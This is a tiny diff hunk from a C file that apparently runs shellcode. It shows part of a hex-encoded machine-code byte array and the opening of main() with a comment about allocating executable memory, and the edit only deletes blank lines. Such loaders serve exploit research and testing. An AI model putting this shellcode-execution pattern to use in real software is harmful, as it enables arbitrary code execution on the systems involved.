@@ -81,9 +81,6 @@ char code[] = \
 	"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
 	"\x52\xff\xd0";
 
-
-
-
 int main(int argc, char **argv)
 {
 	// Allocating memory with EXECUTE writes
